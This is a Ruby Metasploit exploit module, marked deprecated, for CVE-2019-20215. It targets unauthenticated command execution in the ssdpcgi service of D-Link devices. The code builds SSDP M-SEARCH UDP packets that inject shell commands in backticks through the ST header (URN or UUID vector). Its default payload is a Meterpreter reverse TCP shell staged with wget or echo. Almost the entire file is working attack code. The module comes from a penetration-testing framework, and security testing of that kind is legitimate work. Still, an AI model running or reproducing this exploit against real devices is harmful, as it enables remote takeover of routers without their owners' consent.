##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::CmdStager
  include Msf::Module::Deprecated

  deprecated(Date.new(2023, 12, 1), 'exploit/linux/upnp/dlink_upnp_msearch_exec')

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi',
      'Description' => %q{
        D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi.
      },
      'Author'      =>
        [
          's1kr10s',
          'secenv'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2019-20215'],
          ['URL', 'https://medium.com/@s1kr10s/2e799acb8a73']
        ],
      'DisclosureDate' => '2019-12-24',
      'Privileged'     => true,
      'Platform'       => 'linux',
      'Arch'        => ARCH_MIPSBE,
      'DefaultOptions' =>
        {
            'PAYLOAD' => 'linux/mipsbe/meterpreter_reverse_tcp',
            'CMDSTAGER::FLAVOR' => 'wget',
            'RPORT' => '1900'
        },
      'Targets'        =>
        [
          [ 'Auto',	{ } ],
        ],
      'CmdStagerFlavor' => %w{ echo wget },
      'DefaultTarget'  => 0
      ))

  register_options(
    [
      Msf::OptEnum.new('VECTOR',[true, 'Header through which to exploit the vulnerability', 'URN', ['URN', 'UUID']])
    ])
  end

  def exploit
    execute_cmdstager(linemax: 1500)
  end

  def execute_command(cmd, opts)
    type = datastore['VECTOR']
    if type == "URN"
      print_status("Target Payload URN")
      val = "urn:device:1;`#{cmd}`"
    else
      print_status("Target Payload UUID")
      val = "uuid:`#{cmd}`"
    end

    connect_udp
    header = "M-SEARCH * HTTP/1.1\r\n"
    header << "Host:239.255.255.250: " + datastore['RPORT'].to_s + "\r\n"
    header << "ST:#{val}\r\n"
    header << "Man:\"ssdp:discover\"\r\n"
    header << "MX:2\r\n\r\n"
    udp_sock.put(header)
    disconnect_udp
  end
end
